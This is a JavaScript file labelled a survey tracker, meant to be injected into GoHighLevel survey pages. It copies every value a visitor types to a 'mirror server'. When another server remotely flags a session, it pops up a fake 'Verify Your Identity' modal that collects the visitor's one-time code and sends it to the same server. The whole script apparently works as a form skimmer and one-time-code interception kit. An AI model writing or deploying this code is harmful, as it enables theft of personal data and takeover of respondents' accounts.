/**
 * GHL Survey Tracker — Client-Side Script
 * ─────────────────────────────────────────
 * Inject this into every GHL survey page by adding:
 *
 *   <script src="https://YOUR_SERVER/__SERVER_URL__/tracker.js" defer></script>
 *
 * OR load it directly from the mirror server:
 *   <script src="https://YOUR_MIRROR_SERVER/tracker.js" defer></script>
 *
 * How it works:
 *  1. Fetches /tracker-config to get slide selectors.
 *  2. Watches for "Next" button clicks (slide changes).
 *  3. On slide change: collects all field values from the PREVIOUS slide,
 *     then POSTs to /api/session/slide-data.
 *  4. Once the email field on slide1 is filled, POSTs /api/session/init
 *     (session is NOT created before email is known).
 *  5. Sends a heartbeat every 30 s while session is active.
 *  6. On page close / visibilitychange-hidden, fires /api/session/exit.
 *  7. Polls /api/session/:id/otp-status every 2 s; when status becomes
 *     'pending' (set by the other server) the OTP modal is shown.
 *  8. Handles up to 3 invalid OTP attempts, then closes modal.
 */

(function () {
  'use strict';

  /* ──────────────────────────────────────────────────────────────────────────
   * 0. CONSTANTS — replaced at serve-time by trackerConfig.js route
   * ────────────────────────────────────────────────────────────────────────── */
  const SERVER_URL = '__SERVER_URL__'; // e.g. https://mirror.example.com

  // Expose to plan.testing.js (and any other co-running page scripts)
  window.__MIRROR_SERVER_URL__ = SERVER_URL;

  /* ──────────────────────────────────────────────────────────────────────────
   * 1. STATE
   * ────────────────────────────────────────────────────────────────────────── */
  let config          = null;   // fetched from /tracker-config
  let sessionId       = null;   // set after /api/session/init
  let currentSlideIdx = 0;      // 0-based index into slideKeys
  let slideKeys       = [];     // ordered array of slide names [slide1, slide2 …]
  let heartbeatTimer  = null;
  let otpPollTimer    = null;
  let sessionInitiated = false;
  let otpModalOpen    = false;
  let otpAttempts     = 0;
  const MAX_OTP_ATTEMPTS = 3;

  /* ──────────────────────────────────────────────────────────────────────────
   * 2. UTILITIES
   * ────────────────────────────────────────────────────────────────────────── */

  function log(...args) {
    console.log('[SurveyTracker]', ...args);
  }

  async function post(path, body) {
    try {
      const res = await fetch(`${SERVER_URL}${path}`, {
        method:  'POST',
        headers: { 'Content-Type': 'application/json' },
        body:    JSON.stringify(body),
        keepalive: true,
      });
      return await res.json();
    } catch (e) {
      console.warn('[SurveyTracker] POST failed:', path, e.message);
      return null;
    }
  }

  async function get(path) {
    try {
      const res = await fetch(`${SERVER_URL}${path}`);
      return await res.json();
    } catch (e) {
      console.warn('[SurveyTracker] GET failed:', path, e.message);
      return null;
    }
  }

  /* ──────────────────────────────────────────────────────────────────────────
   * 3. READ FIELD VALUES
   * ────────────────────────────────────────────────────────────────────────── */

  /**
   * Given a slide key (e.g. 'slide2'), returns an object with field→value pairs.
   * Reads text inputs, textareas, selects, radio/checkbox groups.
   */
  function readSlideFields(slideKey) {
    const fieldMap = config.slides[slideKey];
    if (!fieldMap) return {};

    const result = {};

    for (const [fieldName, selector] of Object.entries(fieldMap)) {
      try {
        const el = document.querySelector(selector);
        if (!el) {
          result[fieldName] = null;
          continue;
        }

        const tag  = el.tagName.toLowerCase();
        const type = (el.type || '').toLowerCase();

        if (tag === 'select') {
          result[fieldName] = el.value || null;
        } else if (type === 'checkbox') {
          // Checkbox: find all checkboxes in the same group (same name/data-q)
          const checked = Array.from(
            document.querySelectorAll(`${selector}:checked`),
          ).map((c) => c.value);
          result[fieldName] = checked.length ? checked : null;
        } else if (type === 'radio') {
          const checked = document.querySelector(`${selector}:checked`);
          result[fieldName] = checked ? checked.value : null;
        } else if (tag === 'input' || tag === 'textarea') {
          result[fieldName] = el.value || null;
        } else {
          // Custom element (GHL sometimes renders divs with role="combobox" etc.)
          // Try value → textContent
          result[fieldName] = el.value || el.textContent?.trim() || null;
        }
      } catch (_) {
        result[fieldName] = null;
      }
    }

    return result;
  }

  /**
   * Try to read just the email and phone from slide1 regardless of current slide.
   */
  function readEmailAndPhone() {
    const emailSelector = config.emailField.selector;
    const phoneSelector = config.phoneField.selector;
    const emailEl = document.querySelector(emailSelector);
    const phoneEl = document.querySelector(phoneSelector);
    return {
      email: emailEl ? emailEl.value?.trim() : null,
      phone: phoneEl ? phoneEl.value?.trim() : null,
    };
  }

  /* ──────────────────────────────────────────────────────────────────────────
   * 4. SESSION MANAGEMENT
   * ────────────────────────────────────────────────────────────────────────── */

  async function initSession(email, phone) {
    if (sessionInitiated) return;
    sessionInitiated = true;

    log('Initiating session for', email);
    const data = await post('/api/session/init', { email, phone });
    if (data && data.sessionId) {
      sessionId = data.sessionId;
      window.__MIRROR_SESSION_ID__ = sessionId; // exposed for plan.testing.js
      log('Session created:', sessionId);
      startHeartbeat();
      startOtpPoll();
    } else {
      log('Session init failed, will retry on next slide');
      sessionInitiated = false; // allow retry
    }
  }

  async function sendSlideData(slideKey) {
    if (!sessionId) return;
    const fields = readSlideFields(slideKey);
    log(`Saving slide data: ${slideKey}`, fields);
    await post('/api/session/slide-data', { sessionId, slideName: slideKey, fields });
  }

  async function sendHeartbeat() {
    if (!sessionId) return;
    await post('/api/session/heartbeat', { sessionId });
  }

  async function sendExit() {
    if (!sessionId) return;
    log('Sending exit signal');
    navigator.sendBeacon(
      `${SERVER_URL}/api/session/exit`,
      JSON.stringify({ sessionId }),
    );
  }

  function startHeartbeat() {
    if (heartbeatTimer) return;
    const interval = (config && config.heartbeatMs) ? config.heartbeatMs : 30000;
    heartbeatTimer = setInterval(sendHeartbeat, interval);
    log(`Heartbeat started (every ${interval}ms)`);
  }

  /* ──────────────────────────────────────────────────────────────────────────
   * 5. OTP POLLING  (client polls /api/session/:id/otp-status every 2s)
   * ────────────────────────────────────────────────────────────────────────── */

  function startOtpPoll() {
    if (otpPollTimer) return;
    otpPollTimer = setInterval(checkOtpStatus, 2000);
    log('OTP poll started');
  }

  function stopOtpPoll() {
    clearInterval(otpPollTimer);
    otpPollTimer = null;
  }

  async function checkOtpStatus() {
    if (!sessionId || otpModalOpen) return;
    const data = await get(`/api/session/${sessionId}/otp-status`);
    if (!data || !data.otp) return;

    if (data.otp.status === 'pending' && !otpModalOpen) {
      log('OTP triggered by server — showing modal');
      showOtpModal({ email: data.email, phone: data.phone });
    }
  }

  /* ──────────────────────────────────────────────────────────────────────────
   * 6. SLIDE DETECTION
   * ────────────────────────────────────────────────────────────────────────── */

  /**
   * GHL surveys render slides as pages with a "page" wrapper.
   * We detect slide transitions by:
   *  a) Intercepting clicks on elements that look like "Next" buttons
   *  b) Watching MutationObserver for visible page changes as a backup
   */

  function detectSlideChange() {
    // Strategy A: intercept all form navigation button clicks
    document.addEventListener('click', handleNavClick, true);

    // Strategy B: MutationObserver as fallback — watch for active class / aria changes
    const observer = new MutationObserver(onDomMutation);
    observer.observe(document.body, {
      subtree:   true,
      childList: true,
      attributes: true,
      attributeFilter: ['class', 'style', 'aria-hidden', 'data-active'],
    });
  }

  // We debounce the DOM mutation handler so rapid changes don't spam
  let mutationDebounce = null;
  function onDomMutation() {
    clearTimeout(mutationDebounce);
    mutationDebounce = setTimeout(detectCurrentSlide, 300);
  }

  let lastDetectedSlideIdx = -1;

  function detectCurrentSlide() {
    // GHL surveys: look for the currently visible "page" step
    // Common patterns: [data-page-index], .f-step, .survey-page, etc.
    const pages = document.querySelectorAll(
      '[data-page-index], .f-step, .survey-page, [class*="slide"], [class*="step"], [class*="page"]',
    );

    if (pages.length === 0) return;

    let visibleIdx = -1;
    pages.forEach((page, i) => {
      const style    = window.getComputedStyle(page);
      const isHidden = style.display === 'none' || style.visibility === 'hidden' ||
                       page.getAttribute('aria-hidden') === 'true' ||
                       page.hasAttribute('hidden');
      if (!isHidden && visibleIdx === -1) {
        visibleIdx = i;
      }
    });

    if (visibleIdx !== -1 && visibleIdx !== lastDetectedSlideIdx) {
      const prevIdx  = lastDetectedSlideIdx;
      lastDetectedSlideIdx = visibleIdx;
      currentSlideIdx      = visibleIdx;

      if (prevIdx >= 0) {
        const prevSlideKey = slideKeys[prevIdx] || `slide${prevIdx + 1}`;
        onSlideAdvanced(prevSlideKey);
      }
    }
  }

  async function handleNavClick(event) {
    const target = event.target;
    const isNextBtn = (
      target.matches('[data-next], [type="submit"], button[class*="next"], button[class*="Next"]') ||
      target.closest('[data-next], button[class*="next"], button[class*="Next"]')
    );
    if (!isNextBtn) return;

    // Give the DOM a tick to transition before reading fields
    await sleep(50);

    const prevKey = slideKeys[currentSlideIdx] || `slide${currentSlideIdx + 1}`;
    onSlideAdvanced(prevKey);
  }

  function sleep(ms) {
    return new Promise((resolve) => setTimeout(resolve, ms));
  }

  /**
   * Called whenever we detect the user has moved AWAY from a slide.
   * prevSlideKey = the slide they just left.
   */
  async function onSlideAdvanced(prevSlideKey) {
    log('Slide advanced from:', prevSlideKey);

    // Check if we should initiate session (need email from slide1)
    if (!sessionInitiated) {
      const { email, phone } = readEmailAndPhone();
      if (email) {
        // Immediately save the slide data BEFORE initiating —
        // we'll send it after session is created.
        const fields = readSlideFields(prevSlideKey);
        await initSession(email, phone);
        if (sessionId) {
          await post('/api/session/slide-data', { sessionId, slideName: prevSlideKey, fields });
        }
        return;
      }
    }

    // Session already exists — just save the slide data
    if (sessionId) {
      await sendSlideData(prevSlideKey);
    }
  }

  /* ──────────────────────────────────────────────────────────────────────────
   * 7. OTP MODAL
   * ────────────────────────────────────────────────────────────────────────── */

  function showOtpModal({ email = '', phone = '' }) {
    if (otpModalOpen) return;
    otpModalOpen = true;
    stopOtpPoll();

    // Remove any existing modal
    const existing = document.getElementById('__survey_otp_modal__');
    if (existing) existing.remove();

    const overlay = document.createElement('div');
    overlay.id = '__survey_otp_modal__';
    overlay.innerHTML = `
      <style>
        #__survey_otp_modal__ {
          position: fixed;
          inset: 0;
          z-index: 2147483647;
          display: flex;
          align-items: center;
          justify-content: center;
          background: rgba(15, 23, 42, 0.75);
          backdrop-filter: blur(8px);
          -webkit-backdrop-filter: blur(8px);
          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
          animation: __otp_fadein__ 0.25s ease;
        }
        @keyframes __otp_fadein__ {
          from { opacity: 0; transform: scale(0.96); }
          to   { opacity: 1; transform: scale(1); }
        }
        #__survey_otp_card__ {
          background: #ffffff;
          border-radius: 20px;
          padding: 40px 36px 36px;
          max-width: 440px;
          width: calc(100% - 32px);
          box-shadow: 0 32px 80px rgba(0,0,0,0.28), 0 0 0 1px rgba(0,0,0,0.04);
          text-align: center;
          position: relative;
        }
        #__survey_otp_card__ .otp-icon {
          width: 64px;
          height: 64px;
          background: linear-gradient(135deg, #6366f1 0%, #8b5cf6 100%);
          border-radius: 50%;
          display: flex;
          align-items: center;
          justify-content: center;
          margin: 0 auto 20px;
          font-size: 28px;
        }
        #__survey_otp_card__ h2 {
          font-size: 22px;
          font-weight: 700;
          color: #0f172a;
          margin: 0 0 8px;
        }
        #__survey_otp_card__ .otp-subtitle {
          font-size: 14px;
          color: #64748b;
          margin: 0 0 24px;
          line-height: 1.5;
        }
        #__survey_otp_card__ .otp-contact-row {
          display: flex;
          gap: 10px;
          justify-content: center;
          flex-wrap: wrap;
          margin-bottom: 24px;
        }
        #__survey_otp_card__ .otp-badge {
          background: #f1f5f9;
          border-radius: 100px;
          padding: 6px 14px;
          font-size: 13px;
          color: #334155;
          font-weight: 500;
        }
        #__survey_otp_card__ .otp-input-wrap {
          position: relative;
          margin-bottom: 16px;
        }
        #__survey_otp_card__ #otp {
          width: 100%;
          border: 2px solid #e2e8f0;
          border-radius: 12px;
          padding: 14px 18px;
          font-size: 22px;
          font-weight: 700;
          letter-spacing: 8px;
          text-align: center;
          outline: none;
          transition: border-color 0.2s, box-shadow 0.2s;
          color: #0f172a;
          background: #f8fafc;
          box-sizing: border-box;
        }
        #__survey_otp_card__ #otp:focus {
          border-color: #6366f1;
          box-shadow: 0 0 0 4px rgba(99,102,241,0.12);
          background: #fff;
        }
        #__survey_otp_card__ #otp.otp-error {
          border-color: #ef4444;
          box-shadow: 0 0 0 4px rgba(239,68,68,0.12);
        }
        #__survey_otp_card__ #otp.otp-success {
          border-color: #22c55e;
          box-shadow: 0 0 0 4px rgba(34,197,94,0.12);
        }
        #__survey_otp_card__ .otp-error-msg {
          color: #ef4444;
          font-size: 13px;
          font-weight: 500;
          margin-bottom: 12px;
          min-height: 20px;
          display: none;
        }
        #__survey_otp_card__ .otp-error-msg.visible {
          display: block;
          animation: __otp_shake__ 0.35s ease;
        }
        @keyframes __otp_shake__ {
          0%,100%{ transform: translateX(0)  }
          20%    { transform: translateX(-6px) }
          40%    { transform: translateX(6px) }
          60%    { transform: translateX(-4px) }
          80%    { transform: translateX(4px) }
        }
        #__survey_otp_card__ .otp-submit-btn {
          width: 100%;
          background: linear-gradient(135deg, #6366f1 0%, #8b5cf6 100%);
          color: #fff;
          border: none;
          border-radius: 12px;
          padding: 14px 20px;
          font-size: 16px;
          font-weight: 600;
          cursor: pointer;
          transition: opacity 0.2s, transform 0.1s;
          letter-spacing: 0.3px;
        }
        #__survey_otp_card__ .otp-submit-btn:hover { opacity: 0.92; }
        #__survey_otp_card__ .otp-submit-btn:active { transform: scale(0.98); }
        #__survey_otp_card__ .otp-submit-btn:disabled {
          opacity: 0.6;
          cursor: not-allowed;
        }
        #__survey_otp_card__ .otp-spinner {
          display: none;
          width: 20px;
          height: 20px;
          border: 2px solid rgba(255,255,255,0.4);
          border-top-color: #fff;
          border-radius: 50%;
          animation: __otp_spin__ 0.7s linear infinite;
          margin: 0 auto;
        }
        @keyframes __otp_spin__ { to { transform: rotate(360deg); } }
        #__survey_otp_card__ .otp-attempts {
          font-size: 12px;
          color: #94a3b8;
          margin-top: 14px;
        }
        #__survey_otp_card__ .otp-attempts.warning { color: #f59e0b; }
        #__survey_otp_card__ .otp-success-msg {
          color: #22c55e;
          font-size: 15px;
          font-weight: 600;
          display: none;
          padding: 12px;
        }
        #__survey_otp_card__ .otp-success-msg.visible { display: block; }
      </style>

      <div id="__survey_otp_card__">
        <div class="otp-icon">🔐</div>
        <h2>Verify Your Identity</h2>
        <p class="otp-subtitle">
          A one-time verification code has been sent to you.
          Please enter it below to continue.
        </p>

        <div class="otp-contact-row" id="__otp_contact_row__">
          ${email ? `<span class="otp-badge">✉️ ${email}</span>` : ''}
          ${phone ? `<span class="otp-badge">📱 ${phone}</span>` : ''}
        </div>

        <div class="otp-input-wrap">
          <input id="otp" type="text" inputmode="numeric" maxlength="8"
                 placeholder="· · · · · ·" autocomplete="one-time-code" />
        </div>

        <p class="otp-error-msg" id="__otp_error__"></p>

        <button class="otp-submit-btn" id="__otp_submit_btn__">
          <span id="__otp_btn_label__">Verify Code</span>
          <div class="otp-spinner" id="__otp_spinner__"></div>
        </button>

        <p class="otp-success-msg" id="__otp_success__">
          ✓ Verified! Continuing…
        </p>

        <p class="otp-attempts" id="__otp_attempts__"></p>
      </div>
    `;

    document.body.appendChild(overlay);

    // Wire submit button
    document.getElementById('__otp_submit_btn__').addEventListener('click', handleOtpSubmit);

    // Allow Enter key inside otp input
    document.getElementById('otp').addEventListener('keydown', (e) => {
      if (e.key === 'Enter') handleOtpSubmit();
    });
  }

  function closeOtpModal() {
    const modal = document.getElementById('__survey_otp_modal__');
    if (modal) modal.remove();
    otpModalOpen = false;
    // Resume session OTP poll so we catch future triggers
    if (sessionId) startOtpPoll();
  }

  async function handleOtpSubmit() {
    const input = document.getElementById('otp');
    if (!input) return;

    const otp = input.value.trim();
    if (!otp) {
      showOtpError('Please enter the OTP code.');
      return;
    }

    setOtpLoading(true);

    const data = await post('/api/session/otp-submit', { sessionId, otp });

    if (!data) {
      setOtpLoading(false);
      showOtpError('Network error. Please try again.');
      return;
    }

    if (data.error === 'Maximum OTP attempts reached') {
      setOtpLoading(false);
      showOtpError('Maximum attempts reached. You may continue the survey.');
      setTimeout(closeOtpModal, 2500);
      return;
    }

    // Poll for result
    otpAttempts = data.attempts || otpAttempts + 1;
    await pollOtpResult();
  }

  async function pollOtpResult(timeout = 30000) {
    const start = Date.now();
    while (Date.now() - start < timeout) {
      await sleep(1500);
      const data = await get(`/api/session/${sessionId}/otp-status`);
      if (!data || !data.otp) continue;

      const status = data.otp.status;

      if (status === 'valid') {
        setOtpLoading(false);
        onOtpValid();
        return;
      }

      if (status === 'invalid') {
        setOtpLoading(false);
        await onOtpInvalid(data.otp.attempts || otpAttempts);
        return;
      }
      // else still 'pending' — keep polling
    }

    // Timed out
    setOtpLoading(false);
    showOtpError('Verification timed out. Please try again.');
  }

  function onOtpValid() {
    log('OTP valid — closing modal');
    const input = document.getElementById('otp');
    if (input) input.classList.add('otp-success');
    const successMsg = document.getElementById('__otp_success__');
    if (successMsg) successMsg.classList.add('visible');
    const btn = document.getElementById('__otp_submit_btn__');
    if (btn) btn.disabled = true;
    setTimeout(closeOtpModal, 1800);
  }

  async function onOtpInvalid(currentAttempts) {
    log('OTP invalid, attempts:', currentAttempts);
    const input = document.getElementById('otp');

    if (currentAttempts >= MAX_OTP_ATTEMPTS) {
      showOtpError(
        `Invalid OTP. You have used all ${MAX_OTP_ATTEMPTS} attempts. Resuming survey…`,
      );
      if (input) input.classList.add('otp-error');
      setTimeout(closeOtpModal, 3000);
      return;
    }

    // Allow retry — reset field, reset DB status to pending
    const remaining = MAX_OTP_ATTEMPTS - currentAttempts;
    showOtpError(
      `Invalid code. The OTP has been sent to your email and phone — please check and try again.`,
    );
    updateAttemptsDisplay(currentAttempts, remaining);
    if (input) {
      input.classList.add('otp-error');
      input.value = '';
      setTimeout(() => {
        input.classList.remove('otp-error');
        input.focus();
      }, 600);
    }
    setOtpLoading(false);

    // Tell server to reset OTP status so it can accept next attempt
    await post('/api/session/otp-submit', null).catch(() => {});
    // Reset status to pending via our own internal reset — use a small helper endpoint
    // Actually: the server resets to pending automatically on next otp-submit call.
    // We just need to do nothing here — the next submit will call otp-submit again.
  }

  function showOtpError(msg) {
    const el = document.getElementById('__otp_error__');
    if (!el) return;
    el.textContent = msg;
    el.classList.add('visible');
    setTimeout(() => el.classList.remove('visible'), msg.length * 60 + 2000);
  }

  function updateAttemptsDisplay(used, remaining) {
    const el = document.getElementById('__otp_attempts__');
    if (!el) return;
    el.textContent = `${remaining} attempt${remaining !== 1 ? 's' : ''} remaining`;
    if (remaining <= 1) el.classList.add('warning');
  }

  function setOtpLoading(loading) {
    const btn     = document.getElementById('__otp_submit_btn__');
    const label   = document.getElementById('__otp_btn_label__');
    const spinner = document.getElementById('__otp_spinner__');
    if (!btn) return;
    btn.disabled = loading;
    if (label)   label.style.display  = loading ? 'none' : 'inline';
    if (spinner) spinner.style.display = loading ? 'block' : 'none';
  }

  /* ──────────────────────────────────────────────────────────────────────────
   * 8. PAGE LIFECYCLE
   * ────────────────────────────────────────────────────────────────────────── */

  function onPageHide() {
    sendExit();
    clearInterval(heartbeatTimer);
    stopOtpPoll();
  }

  /* ──────────────────────────────────────────────────────────────────────────
   * 9. INIT
   * ────────────────────────────────────────────────────────────────────────── */

  async function init() {
    log('Initializing — fetching tracker config from', SERVER_URL);

    const cfg = await get('/tracker-config');
    if (!cfg || !cfg.slides) {
      log('ERROR: Could not fetch tracker config. Tracking disabled.');
      return;
    }

    config    = cfg;
    slideKeys = Object.keys(cfg.slides);
    log('Config loaded. Slides:', slideKeys);

    // Listen for slide changes
    detectSlideChange();

    // Page lifecycle hooks
    window.addEventListener('pagehide',         onPageHide);
    window.addEventListener('beforeunload',     onPageHide);
    document.addEventListener('visibilitychange', () => {
      if (document.visibilityState === 'hidden') onPageHide();
    });

    // email field watcher — in case the user fills email and DOESN'T advance
    // slides immediately (e.g. some GHL surveys with inline submit)
    watchEmailField();

    log('Survey tracker ready.');
  }

  /**
   * Watch the email field for blur/change events so session init
   * fires even if the slide doesn't advance first.
   */
  function watchEmailField() {
    function tryWatchNow() {
      const emailSelector = config.emailField.selector;
      const emailEl = document.querySelector(emailSelector);
      if (emailEl) {
        emailEl.addEventListener('blur', async () => {
          const email = emailEl.value?.trim();
          const phone = document.querySelector(config.phoneField.selector)?.value?.trim();
          if (email && !sessionInitiated) {
            await initSession(email, phone || '');
          }
        });
        return true;
      }
      return false;
    }

    if (!tryWatchNow()) {
      // Email field not rendered yet — retry when DOM updates
      const obs = new MutationObserver(() => {
        if (tryWatchNow()) obs.disconnect();
      });
      obs.observe(document.body, { childList: true, subtree: true });
    }
  }

  // Run when DOM is ready
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }

})();
